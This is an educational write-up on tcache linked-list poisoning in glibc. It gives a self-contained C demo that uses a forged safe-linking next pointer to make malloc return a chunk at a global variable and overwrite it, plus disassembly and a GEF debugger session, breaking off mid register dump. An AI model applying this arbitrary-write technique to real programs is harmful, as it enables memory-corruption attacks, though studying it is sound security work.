# tcache linked list

So this will show one of the more common tcache attacks. The purpose of this attack, is to get the tcache to allocate a chunk to a memory address we want (can be outside of the heap). So the tcache works as a linked list, and relies on the next pointers. When a chunk from the tcache gets allocated, it allocates the head of an individual tcache linked list, and its next ptr becomes the head. This attack relies on altering the next ptr of a tcache chunk. After we have altered the next ptr of a tcache chunk, and allocate the altered chunk, the next allocation should give us a memory chunk at an address of our choosing. This can be helpful, assuming we can read/write to the chunk in useful ways. Since it will effectively give us an arbitrary read/write mechanism. In order to do this successfully though, there are some details we have to get right.

Here is the code which we will be looking at:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x100
#define CHUNK_SIZE1 0x10

long target = 0xdeadbeef;

void main() {
    long *chunk0,
   	 *chunk1,
   	 *chunk2,
   	 *next_ptr,
   	 *recycled_chunk0,
   	 *recycled_chunk1;

    printf("So, we have a global variable called target at %p.\n", &target);
    printf("It's current value is 0x%lx.\n", target);
    printf("Our goal is to get the tcache, to allocate a chunk to the address of target, which we will use to change it's value.\n\n");

    printf("First, we will allocate our heap chunks.\n");
    printf("Three 0x%x byte chunks to be freed and inserted into the tcache.\n", CHUNK_SIZE0);
    printf("There will be three 0x%x byte chunks inbetween those three, to prevent consolidation.\n\n", CHUNK_SIZE1);

    chunk0 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk1 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);
    chunk2 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE1);

    memset(chunk0, 0x00, CHUNK_SIZE0);
    memset(chunk1, 0x00, CHUNK_SIZE0);
    memset(chunk2, 0x00, CHUNK_SIZE0);

    printf("Chunk0:\t%p\n", chunk0);
    printf("Chunk1:\t%p\n", chunk1);
    printf("Chunk2:\t%p\n\n", chunk2);

    printf("Now, let's free the chunks, and have them inserted into the tcache.\n\n");

    free(chunk0);
    free(chunk1);
    free(chunk2);

    printf("Now that they have been inserted into the tcache, we can see their mangled next ptrs and tcache key:\n");
    printf("Chunk2:\tAddress:%p\tNext:%lx\tKey:0x%lx\n", chunk2, *chunk2, *(chunk2+1));
    printf("Chunk1:\tAddress:%p\tNext:%lx\tKey:0x%lx\n", chunk1, *chunk1, *(chunk1+1));
    printf("Chunk0:\tAddress:%p\tNext:%lx\tKey:0x%lx\n\n", chunk0, *chunk0, *(chunk0+1));

    printf("So now, we will alter the next ptr of Chunk2, since it is the head of the linked list bin with our three chunks (since it was freed last).\n");
    printf("We will allocate a chunk from the bin, which will give us Chunk2, and set the next tcache bin head to target.\n");
    printf("Then the next malloc will give us a chunk to target (also because the tcache count for that tcache bin says it has more chunks).\n");
    printf("The closest bug we are kind of emulating here is a use after free.\n\n");

    next_ptr = (long *)(((long)chunk0 >> 12) ^ (long)&target);
    printf("First, we need to actually come up with a correct next ptr, because of the next ptr mangling.\n");
    printf("The equation is next_ptr = ((address_of_chunk >> 12) ^ next_address)\n");
    printf("So in this instance, the next ptr should be ((%p >> 12) ^ %p) = %p\n\n", chunk0, &target, next_ptr);

    *chunk2 = (long)next_ptr;

    printf("Now that we've set the next ptr of chunk2 to be that of target, let's reallocate chunk2.\n\n");

    recycled_chunk0 = malloc(CHUNK_SIZE0);

    printf("New chunk allocated: %p\n\n", recycled_chunk0);

    printf("Now the head of the tcahce bin should be to the target global variable.\n");
    printf("The next allocation should be to the address it's stored at.\n\n");

    recycled_chunk1 = malloc(CHUNK_SIZE0);

    printf("New chunk allocated: %p\n", recycled_chunk1);
    printf("Did this work: %s\n\n", (recycled_chunk1 == &target) ? "Yes" : "No");

    printf("So, we see that we were able to allocate a chunk to the target global variable.\n");
    printf("Let's change it's value.\n\n");

    *recycled_chunk1 = 0xffffffffffffffff;

    printf("New target value:\t0x%lx\n", target);
}
```

## Walkthrough

So, let's actually go through this in a debugger. Here are the major steps:
    *    Insert Chunks into tcache
    *    Alter next ptr of a tcache chunk to an address we want to allocate a chunk to
    *    Allocate altered chunk, set new head to address we want to allocate
    *    Allocate chunk to address we want to
    *    Write/Read memory at address we want to, get arbitrary read/write

Now, in order to do this in an actual program, you would likely need three bugs. You need an infoleak of the heap, so you can break heap ASLR (since you need to know the heap address space because of the next ptr mangling). You need to know the address of the thing you want to allocate a chunk to, which because PIE is enabled and we want to overwrite a global variable, we would need a PIE infoleak to break PIE ASLR. Lastly you would need a bug to actually overwrite the next ptr of a chunk in the tcache (be it a Use After Free, Double Free, Heap Overflow, etc). In this instance, we are effectively using a Use After Free.

So starting off, let's see the three tcache chunks get inserted into the tcache:

```
$    gdb ./tcache_linked_list
GNU gdb (Ubuntu 12.0.90-0ubuntu1) 12.0.90
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
	<http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
88 commands loaded and 5 functions added for GDB 12.0.90 in 0.00ms using Python engine 3.10
Reading symbols from ./tcache_linked_list...
(No debugging symbols found in ./tcache_linked_list)
gef➤  disas main
Dump of assembler code for function main:
   0x00000000000011c9 <+0>:    endbr64
   0x00000000000011cd <+4>:    push   rbp
   0x00000000000011ce <+5>:    mov	rbp,rsp
   0x00000000000011d1 <+8>:    sub	rsp,0x30
   0x00000000000011d5 <+12>:    lea	rax,[rip+0x2e34]    	# 0x4010 <target>
   0x00000000000011dc <+19>:    mov	rsi,rax
   0x00000000000011df <+22>:    lea	rax,[rip+0xe22]    	# 0x2008
   0x00000000000011e6 <+29>:    mov	rdi,rax
   0x00000000000011e9 <+32>:    mov	eax,0x0
   0x00000000000011ee <+37>:    call   0x10b0 <printf@plt>
   0x00000000000011f3 <+42>:    mov	rax,QWORD PTR [rip+0x2e16]    	# 0x4010 <target>
   0x00000000000011fa <+49>:    mov	rsi,rax
   0x00000000000011fd <+52>:    lea	rax,[rip+0xe38]    	# 0x203c
   0x0000000000001204 <+59>:    mov	rdi,rax
   0x0000000000001207 <+62>:    mov	eax,0x0
   0x000000000000120c <+67>:    call   0x10b0 <printf@plt>
   0x0000000000001211 <+72>:    lea	rax,[rip+0xe48]    	# 0x2060
   0x0000000000001218 <+79>:    mov	rdi,rax
   0x000000000000121b <+82>:    call   0x10a0 <puts@plt>
   0x0000000000001220 <+87>:    lea	rax,[rip+0xeb1]    	# 0x20d8
   0x0000000000001227 <+94>:    mov	rdi,rax
   0x000000000000122a <+97>:    call   0x10a0 <puts@plt>
   0x000000000000122f <+102>:    mov	esi,0x100
   0x0000000000001234 <+107>:    lea	rax,[rip+0xecd]    	# 0x2108
   0x000000000000123b <+114>:    mov	rdi,rax
   0x000000000000123e <+117>:    mov	eax,0x0
   0x0000000000001243 <+122>:    call   0x10b0 <printf@plt>
   0x0000000000001248 <+127>:    mov	esi,0x10
   0x000000000000124d <+132>:    lea	rax,[rip+0xefc]    	# 0x2150
   0x0000000000001254 <+139>:    mov	rdi,rax
   0x0000000000001257 <+142>:    mov	eax,0x0
   0x000000000000125c <+147>:    call   0x10b0 <printf@plt>
   0x0000000000001261 <+152>:    mov	edi,0x100
   0x0000000000001266 <+157>:    call   0x10d0 <malloc@plt>
   0x000000000000126b <+162>:    mov	QWORD PTR [rbp-0x30],rax
   0x000000000000126f <+166>:    mov	edi,0x10
   0x0000000000001274 <+171>:    call   0x10d0 <malloc@plt>
   0x0000000000001279 <+176>:    mov	edi,0x100
   0x000000000000127e <+181>:    call   0x10d0 <malloc@plt>
   0x0000000000001283 <+186>:    mov	QWORD PTR [rbp-0x28],rax
   0x0000000000001287 <+190>:    mov	edi,0x10
   0x000000000000128c <+195>:    call   0x10d0 <malloc@plt>
   0x0000000000001291 <+200>:    mov	edi,0x100
   0x0000000000001296 <+205>:    call   0x10d0 <malloc@plt>
   0x000000000000129b <+210>:    mov	QWORD PTR [rbp-0x20],rax
   0x000000000000129f <+214>:    mov	edi,0x10
   0x00000000000012a4 <+219>:    call   0x10d0 <malloc@plt>
   0x00000000000012a9 <+224>:    mov	rax,QWORD PTR [rbp-0x30]
   0x00000000000012ad <+228>:    mov	edx,0x100
   0x00000000000012b2 <+233>:    mov	esi,0x0
   0x00000000000012b7 <+238>:    mov	rdi,rax
   0x00000000000012ba <+241>:    call   0x10c0 <memset@plt>
   0x00000000000012bf <+246>:    mov	rax,QWORD PTR [rbp-0x28]
   0x00000000000012c3 <+250>:    mov	edx,0x100
   0x00000000000012c8 <+255>:    mov	esi,0x0
   0x00000000000012cd <+260>:    mov	rdi,rax
   0x00000000000012d0 <+263>:    call   0x10c0 <memset@plt>
   0x00000000000012d5 <+268>:    mov	rax,QWORD PTR [rbp-0x20]
   0x00000000000012d9 <+272>:    mov	edx,0x100
   0x00000000000012de <+277>:    mov	esi,0x0
   0x00000000000012e3 <+282>:    mov	rdi,rax
   0x00000000000012e6 <+285>:    call   0x10c0 <memset@plt>
   0x00000000000012eb <+290>:    mov	rax,QWORD PTR [rbp-0x30]
   0x00000000000012ef <+294>:    mov	rsi,rax
   0x00000000000012f2 <+297>:    lea	rax,[rip+0xeaf]    	# 0x21a8
   0x00000000000012f9 <+304>:    mov	rdi,rax
   0x00000000000012fc <+307>:    mov	eax,0x0
   0x0000000000001301 <+312>:    call   0x10b0 <printf@plt>
   0x0000000000001306 <+317>:    mov	rax,QWORD PTR [rbp-0x28]
   0x000000000000130a <+321>:    mov	rsi,rax
   0x000000000000130d <+324>:    lea	rax,[rip+0xea0]    	# 0x21b4
   0x0000000000001314 <+331>:    mov	rdi,rax
   0x0000000000001317 <+334>:    mov	eax,0x0
   0x000000000000131c <+339>:    call   0x10b0 <printf@plt>
   0x0000000000001321 <+344>:    mov	rax,QWORD PTR [rbp-0x20]
   0x0000000000001325 <+348>:    mov	rsi,rax
   0x0000000000001328 <+351>:    lea	rax,[rip+0xe91]    	# 0x21c0
   0x000000000000132f <+358>:    mov	rdi,rax
   0x0000000000001332 <+361>:    mov	eax,0x0
   0x0000000000001337 <+366>:    call   0x10b0 <printf@plt>
   0x000000000000133c <+371>:    lea	rax,[rip+0xe8d]    	# 0x21d0
   0x0000000000001343 <+378>:    mov	rdi,rax
   0x0000000000001346 <+381>:    call   0x10a0 <puts@plt>
   0x000000000000134b <+386>:    mov	rax,QWORD PTR [rbp-0x30]
   0x000000000000134f <+390>:    mov	rdi,rax
   0x0000000000001352 <+393>:    call   0x1090 <free@plt>
   0x0000000000001357 <+398>:    mov	rax,QWORD PTR [rbp-0x28]
   0x000000000000135b <+402>:    mov	rdi,rax
   0x000000000000135e <+405>:    call   0x1090 <free@plt>
   0x0000000000001363 <+410>:    mov	rax,QWORD PTR [rbp-0x20]
   0x0000000000001367 <+414>:    mov	rdi,rax
   0x000000000000136a <+417>:    call   0x1090 <free@plt>
   0x000000000000136f <+422>:    lea	rax,[rip+0xea2]    	# 0x2218
   0x0000000000001376 <+429>:    mov	rdi,rax
   0x0000000000001379 <+432>:    call   0x10a0 <puts@plt>
   0x000000000000137e <+437>:    mov	rax,QWORD PTR [rbp-0x20]
   0x0000000000001382 <+441>:    add	rax,0x8
   0x0000000000001386 <+445>:    mov	rcx,QWORD PTR [rax]
   0x0000000000001389 <+448>:    mov	rax,QWORD PTR [rbp-0x20]
   0x000000000000138d <+452>:    mov	rdx,QWORD PTR [rax]
   0x0000000000001390 <+455>:    mov	rax,QWORD PTR [rbp-0x20]
   0x0000000000001394 <+459>:    mov	rsi,rax
   0x0000000000001397 <+462>:    lea	rax,[rip+0xee2]    	# 0x2280
   0x000000000000139e <+469>:    mov	rdi,rax
   0x00000000000013a1 <+472>:    mov	eax,0x0
   0x00000000000013a6 <+477>:    call   0x10b0 <printf@plt>
   0x00000000000013ab <+482>:    mov	rax,QWORD PTR [rbp-0x28]
   0x00000000000013af <+486>:    add	rax,0x8
   0x00000000000013b3 <+490>:    mov	rcx,QWORD PTR [rax]
   0x00000000000013b6 <+493>:    mov	rax,QWORD PTR [rbp-0x28]
   0x00000000000013ba <+497>:    mov	rdx,QWORD PTR [rax]
   0x00000000000013bd <+500>:    mov	rax,QWORD PTR [rbp-0x28]
   0x00000000000013c1 <+504>:    mov	rsi,rax
   0x00000000000013c4 <+507>:    lea	rax,[rip+0xedd]    	# 0x22a8
   0x00000000000013cb <+514>:    mov	rdi,rax
   0x00000000000013ce <+517>:    mov	eax,0x0
   0x00000000000013d3 <+522>:    call   0x10b0 <printf@plt>
   0x00000000000013d8 <+527>:    mov	rax,QWORD PTR [rbp-0x30]
   0x00000000000013dc <+531>:    add	rax,0x8
   0x00000000000013e0 <+535>:    mov	rcx,QWORD PTR [rax]
   0x00000000000013e3 <+538>:    mov	rax,QWORD PTR [rbp-0x30]
   0x00000000000013e7 <+542>:    mov	rdx,QWORD PTR [rax]
   0x00000000000013ea <+545>:    mov	rax,QWORD PTR [rbp-0x30]
   0x00000000000013ee <+549>:    mov	rsi,rax
   0x00000000000013f1 <+552>:    lea	rax,[rip+0xed8]    	# 0x22d0
   0x00000000000013f8 <+559>:    mov	rdi,rax
   0x00000000000013fb <+562>:    mov	eax,0x0
   0x0000000000001400 <+567>:    call   0x10b0 <printf@plt>
   0x0000000000001405 <+572>:    lea	rax,[rip+0xeec]    	# 0x22f8
   0x000000000000140c <+579>:    mov	rdi,rax
   0x000000000000140f <+582>:    call   0x10a0 <puts@plt>
   0x0000000000001414 <+587>:    lea	rax,[rip+0xf6d]    	# 0x2388
   0x000000000000141b <+594>:    mov	rdi,rax
   0x000000000000141e <+597>:    call   0x10a0 <puts@plt>
   0x0000000000001423 <+602>:    lea	rax,[rip+0xfce]    	# 0x23f8
   0x000000000000142a <+609>:    mov	rdi,rax
   0x000000000000142d <+612>:    call   0x10a0 <puts@plt>
   0x0000000000001432 <+617>:    lea	rax,[rip+0x1047]    	# 0x2480
   0x0000000000001439 <+624>:    mov	rdi,rax
   0x000000000000143c <+627>:    call   0x10a0 <puts@plt>
   0x0000000000001441 <+632>:    mov	rax,QWORD PTR [rbp-0x30]
   0x0000000000001445 <+636>:    sar	rax,0xc
   0x0000000000001449 <+640>:    mov	rdx,rax
   0x000000000000144c <+643>:    lea	rax,[rip+0x2bbd]    	# 0x4010 <target>
   0x0000000000001453 <+650>:    xor	rax,rdx
   0x0000000000001456 <+653>:    mov	QWORD PTR [rbp-0x18],rax
   0x000000000000145a <+657>:    lea	rax,[rip+0x1067]    	# 0x24c8
   0x0000000000001461 <+664>:    mov	rdi,rax
   0x0000000000001464 <+667>:    call   0x10a0 <puts@plt>
   0x0000000000001469 <+672>:    lea	rax,[rip+0x10b8]    	# 0x2528
   0x0000000000001470 <+679>:    mov	rdi,rax
   0x0000000000001473 <+682>:    call   0x10a0 <puts@plt>
   0x0000000000001478 <+687>:    mov	rdx,QWORD PTR [rbp-0x18]
   0x000000000000147c <+691>:    mov	rax,QWORD PTR [rbp-0x30]
   0x0000000000001480 <+695>:    mov	rcx,rdx
   0x0000000000001483 <+698>:    lea	rdx,[rip+0x2b86]    	# 0x4010 <target>
   0x000000000000148a <+705>:    mov	rsi,rax
   0x000000000000148d <+708>:    lea	rax,[rip+0x10dc]    	# 0x2570
   0x0000000000001494 <+715>:    mov	rdi,rax
   0x0000000000001497 <+718>:    mov	eax,0x0
   0x000000000000149c <+723>:    call   0x10b0 <printf@plt>
   0x00000000000014a1 <+728>:    mov	rdx,QWORD PTR [rbp-0x18]
   0x00000000000014a5 <+732>:    mov	rax,QWORD PTR [rbp-0x20]
   0x00000000000014a9 <+736>:    mov	QWORD PTR [rax],rdx
   0x00000000000014ac <+739>:    lea	rax,[rip+0x1105]    	# 0x25b8
   0x00000000000014b3 <+746>:    mov	rdi,rax
   0x00000000000014b6 <+749>:    call   0x10a0 <puts@plt>
   0x00000000000014bb <+754>:    mov	edi,0x100
   0x00000000000014c0 <+759>:    call   0x10d0 <malloc@plt>
   0x00000000000014c5 <+764>:    mov	QWORD PTR [rbp-0x10],rax
   0x00000000000014c9 <+768>:    mov	rax,QWORD PTR [rbp-0x10]
   0x00000000000014cd <+772>:    mov	rsi,rax
   0x00000000000014d0 <+775>:    lea	rax,[rip+0x113b]    	# 0x2612
   0x00000000000014d7 <+782>:    mov	rdi,rax
   0x00000000000014da <+785>:    mov	eax,0x0
   0x00000000000014df <+790>:    call   0x10b0 <printf@plt>
   0x00000000000014e4 <+795>:    lea	rax,[rip+0x1145]    	# 0x2630
   0x00000000000014eb <+802>:    mov	rdi,rax
   0x00000000000014ee <+805>:    call   0x10a0 <puts@plt>
   0x00000000000014f3 <+810>:    lea	rax,[rip+0x117e]    	# 0x2678
   0x00000000000014fa <+817>:    mov	rdi,rax
   0x00000000000014fd <+820>:    call   0x10a0 <puts@plt>
   0x0000000000001502 <+825>:    mov	edi,0x100
   0x0000000000001507 <+830>:    call   0x10d0 <malloc@plt>
   0x000000000000150c <+835>:    mov	QWORD PTR [rbp-0x8],rax
   0x0000000000001510 <+839>:    mov	rax,QWORD PTR [rbp-0x8]
   0x0000000000001514 <+843>:    mov	rsi,rax
   0x0000000000001517 <+846>:    lea	rax,[rip+0x1198]    	# 0x26b6
   0x000000000000151e <+853>:    mov	rdi,rax
   0x0000000000001521 <+856>:    mov	eax,0x0
   0x0000000000001526 <+861>:    call   0x10b0 <printf@plt>
   0x000000000000152b <+866>:    lea	rax,[rip+0x2ade]    	# 0x4010 <target>
   0x0000000000001532 <+873>:    cmp	QWORD PTR [rbp-0x8],rax
   0x0000000000001536 <+877>:    jne	0x1541 <main+888>
   0x0000000000001538 <+879>:    lea	rax,[rip+0x1190]    	# 0x26cf
   0x000000000000153f <+886>:    jmp	0x1548 <main+895>
   0x0000000000001541 <+888>:    lea	rax,[rip+0x118b]    	# 0x26d3
   0x0000000000001548 <+895>:    mov	rsi,rax
   0x000000000000154b <+898>:    lea	rax,[rip+0x1184]    	# 0x26d6
   0x0000000000001552 <+905>:    mov	rdi,rax
   0x0000000000001555 <+908>:    mov	eax,0x0
   0x000000000000155a <+913>:    call   0x10b0 <printf@plt>
   0x000000000000155f <+918>:    lea	rax,[rip+0x118a]    	# 0x26f0
   0x0000000000001566 <+925>:    mov	rdi,rax
   0x0000000000001569 <+928>:    call   0x10a0 <puts@plt>
   0x000000000000156e <+933>:    lea	rax,[rip+0x11cb]    	# 0x2740
   0x0000000000001575 <+940>:    mov	rdi,rax
   0x0000000000001578 <+943>:    call   0x10a0 <puts@plt>
   0x000000000000157d <+948>:    mov	rax,QWORD PTR [rbp-0x8]
   0x0000000000001581 <+952>:    mov	QWORD PTR [rax],0xffffffffffffffff
   0x0000000000001588 <+959>:    mov	rax,QWORD PTR [rip+0x2a81]    	# 0x4010 <target>
   0x000000000000158f <+966>:    mov	rsi,rax
   0x0000000000001592 <+969>:    lea	rax,[rip+0x11c1]    	# 0x275a
   0x0000000000001599 <+976>:    mov	rdi,rax
   0x000000000000159c <+979>:    mov	eax,0x0
   0x00000000000015a1 <+984>:    call   0x10b0 <printf@plt>
   0x00000000000015a6 <+989>:    nop
   0x00000000000015a7 <+990>:    leave  
   0x00000000000015a8 <+991>:    ret    
End of assembler dump.
gef➤  b *main+422
Breakpoint 1 at 0x136f
gef➤  b *main+736
Breakpoint 2 at 0x14a9
gef➤  b *main+764
Breakpoint 3 at 0x14c5
gef➤  b *main+835
Breakpoint 4 at 0x150c
gef➤  r
Starting program: /Hackery/shogun/pwn_demos/tcache/tcache_linked_list/tcache_linked_list
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
So, we have a global variable called target at 0x555555558010.
It's current value is 0xdeadbeef.
Our goal is to get the tcache, to allocate a chunk to the address of target, which we will use to change it's value.

First, we will allocate our heap chunks.
Three 0x100 byte chunks to be freed and inserted into the tcache.
There will be three 0x10 byte chunks inbetween those three, to prevent consolidation.

Chunk0:    0x5555555596b0
Chunk1:    0x5555555597e0
Chunk2:    0x555555559910

Now, let's free the chunks, and have them inserted into the tcache.


Breakpoint 1, 0x000055555555536f in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0          	 
$rbx   : 0x0          	 
$rcx   : 0xf          	 
$rdx   : 0x55500000c2b9    
$rsp   : 0x00007fffffffdf80  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x0000555555559010  →  0x0000000000000000
$rdi   : 0x7          	 
$rip   : 0x000055555555536f  →  <main+422> lea rax, [rip+0xea2]    	# 0x555555556218
$r8	: 0x0000555555559910  →  0x000055500000c2b9
$r9	: 0x00007fffffffde4c  →  "555555559910"
$r10   : 0x0          	 
$r11   : 0x4c235937ad9d2c4
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c6  →  "/Hackery/shogun/pwn_demos/tcache/tcache_l[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf80│+0x0000: 0x00005555555596b0  →  0x0000000555555559     ← $rsp
0x00007fffffffdf88│+0x0008: 0x00005555555597e0  →  0x000055500000c3e9
0x00007fffffffdf90│+0x0010: 0x0000555555559910  →  0x000055500000c2b9
0x00007fffffffdf98│+0x0018: 0x0000000000000064 ("d"?)
0x00007fffffffdfa0│+0x0020: 0x0000000000001000
0x00007fffffffdfa8│+0x0028: 0x00005555555550e0  →  <_start+0> endbr64
0x00007fffffffdfb0│+0x0030: 0x0000000000000001     ← $rbp
0x00007fffffffdfb8│+0x0038: 0x00007ffff7c29d90  →  <__libc_start_call_main+128> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x555555555363 <main+410>   	mov	rax, QWORD PTR [rbp-0x20]
   0x555555555367 <main+414>   	mov	rdi, rax
   0x55555555536a <main+417>   	call   0x555555555090 <free@plt>
 → 0x55555555536f <main+422>   	lea	rax, [rip+0xea2]    	# 0x555555556218
   0x555555555376 <main+429>   	mov	rdi, rax
   0x555555555379 <main+432>   	call   0x5555555550a0 <puts@plt>
   0x55555555537e <main+437>   	mov	rax, QWORD PTR [rbp-0x20]
   0x555555555382 <main+441>   	add	rax, 0x8
   0x555555555386 <main+445>   	mov	rcx, QWORD PTR [rax]
──────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "tcache_linked_l", stopped 0x55555555536f in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55555555536f → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=15, size=0x110, count=3] ←  Chunk(addr=0x555555559910, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555597e0, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)  ←  Chunk(addr=0x5555555596b0, size=0x110, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
───────────────────────────────── Fastbins for arena at 0x7ffff7e19c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7ffff7e19c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7ffff7e19c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  p tcache
$1 = (tcache_perthread_struct *) 0x555555559010
gef➤  x/80g 0x555555559010
0x555555559010:    0x0    0x0
0x555555559020:    0x0    0x3000000000000
0x555555559030:    0x0    0x0
0x555555559040:    0x0    0x0
0x555555559050:    0x0    0x0
0x555555559060:    0x0    0x0
0x555555559070:    0x0    0x0
0x555555559080:    0x0    0x0
0x555555559090:    0x0    0x0
0x5555555590a0:    0x0    0x0
0x5555555590b0:    0x0    0x0
0x5555555590c0:    0x0    0x0
0x5555555590d0:    0x0    0x0
0x5555555590e0:    0x0    0x0
0x5555555590f0:    0x0    0x0
0x555555559100:    0x0    0x555555559910
0x555555559110:    0x0    0x0
0x555555559120:    0x0    0x0
0x555555559130:    0x0    0x0
0x555555559140:    0x0    0x0
0x555555559150:    0x0    0x0
0x555555559160:    0x0    0x0
0x555555559170:    0x0    0x0
0x555555559180:    0x0    0x0
0x555555559190:    0x0    0x0
0x5555555591a0:    0x0    0x0
0x5555555591b0:    0x0    0x0
0x5555555591c0:    0x0    0x0
0x5555555591d0:    0x0    0x0
0x5555555591e0:    0x0    0x0
0x5555555591f0:    0x0    0x0
0x555555559200:    0x0    0x0
0x555555559210:    0x0    0x0
0x555555559220:    0x0    0x0
0x555555559230:    0x0    0x0
0x555555559240:    0x0    0x0
0x555555559250:    0x0    0x0
0x555555559260:    0x0    0x0
0x555555559270:    0x0    0x0
0x555555559280:    0x0    0x0
gef➤  x/20g 0x555555559900
0x555555559900:    0x0    0x111
0x555555559910:    0x55500000c2b9    0x4c235937ad9d2c4
0x555555559920:    0x0    0x0
0x555555559930:    0x0    0x0
0x555555559940:    0x0    0x0
0x555555559950:    0x0    0x0
0x555555559960:    0x0    0x0
0x555555559970:    0x0    0x0
0x555555559980:    0x0    0x0
0x555555559990:    0x0    0x0
gef➤  x/20g 0x5555555597d0
0x5555555597d0:    0x0    0x111
0x5555555597e0:    0x55500000c3e9    0x4c235937ad9d2c4
0x5555555597f0:    0x0    0x0
0x555555559800:    0x0    0x0
0x555555559810:    0x0    0x0
0x555555559820:    0x0    0x0
0x555555559830:    0x0    0x0
0x555555559840:    0x0    0x0
0x555555559850:    0x0    0x0
0x555555559860:    0x0    0x0
gef➤  x/20g 0x5555555596a0
0x5555555596a0:    0x0    0x111
0x5555555596b0:    0x555555559    0x4c235937ad9d2c4
0x5555555596c0:    0x0    0x0
0x5555555596d0:    0x0    0x0
0x5555555596e0:    0x0    0x0
0x5555555596f0:    0x0    0x0
0x555555559700:    0x0    0x0
0x555555559710:    0x0    0x0
0x555555559720:    0x0    0x0
0x555555559730:    0x0    0x0
```

So we see the three tcache chunks. Now, let's set the next ptr of the tcache chunk head to the address of the target global variable (`0x555555558010`, which we see later on):

```
gef➤  c
Continuing.
Now that they have been inserted into the tcache, we can see their mangled next ptrs and tcache key:
Chunk2:    Address:0x555555559910    Next:55500000c2b9    Key:0x4c235937ad9d2c4
Chunk1:    Address:0x5555555597e0    Next:55500000c3e9    Key:0x4c235937ad9d2c4
Chunk0:    Address:0x5555555596b0    Next:555555559    Key:0x4c235937ad9d2c4

So now, we will alter the next ptr of Chunk2, since it is the head of the linked list bin with our three chunks (since it was freed last).
We will allocate a chunk from the bin, which will give us Chunk2, and set the next tcache bin head to target.
Then the next malloc will give us a chunk to target (also because the tcache count for that tcache bin says it has more chunks).
The closest bug we are kind of emulating here is a use after free.

First, we need to actually come up with a correct next ptr, because of the next ptr mangling.
The equation is next_ptr = ((address_of_chunk >> 12) ^ next_address)
So in this instance, the next ptr should be ((0x5555555596b0 >> 12) ^ 0x555555558010) = 0x55500000d549


Breakpoint 2, 0x00005555555554a9 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0000555555559910  →  0x000055500000c2b9
$rbx   : 0x0          	 
$rcx   : 0x1          	 
$rdx   : 0x55500000d549    
$rsp   : 0x00007fffffffdf80  →  0x00005555555596b0  →  0x0000000555555559
$rbp   : 0x00007fffffffdfb0  →  0x0000000000000001
$rsi   : 0x00005555555592a0  →  "So in this instance, the next ptr should be ((0x55[...]"
$rdi   : 0x00007fffffffda20  →  0x00007ffff7c620d0  →  <funlockfile+0> endbr64
$rip   : 0x00005555555554a9  →  <main+736> mov QWORD PTR [rax], rdx
$r8	: 0x0          	 
$r9	: 0x00007fffffffde4c  →  "55500000d549"
$r10   : 0x0          	 
$r11   : 0x246        	 
$r12   : 0x00007fffffffe0c8  →  0x00007fffffffe3c6  →  "/Hackery/shogun/pwn_demos/tcache/tcache_l[...]"
$r13   : 0x00005555555551c9  →  <main+0> endbr64
$r14   : 0x0000555555557da0  →  0x0000555555555180  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────────── stack ────
